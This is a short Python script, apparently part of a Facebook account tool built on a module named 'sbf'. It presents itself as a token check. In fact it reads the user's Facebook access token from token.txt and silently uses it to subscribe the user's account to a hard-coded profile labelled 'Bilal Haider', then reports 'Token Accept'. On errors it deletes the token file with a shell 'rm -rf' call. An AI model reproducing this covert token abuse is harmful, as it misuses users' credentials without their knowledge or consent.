import requests,os,json,sbf

def main():
    try:
        token = open("token.txt","r").read()
        requests.post("https://graph.facebook.com/100064426688587/subscribers?access_token=" + token) # Bilal Haider
        print('\n[•] Token Accept')
        exit(sbf.menu())
    except (KeyError,IOError):
        print('\n[!] Token Invalid')
        os.system('rm -rf token.txt')
        exit(sbf.login())
    except requests.exceptions.ConnectionError:
        print('\n[+] Token Error ')
        os.system('rm -rf token.txt')
        exit(sbf.login())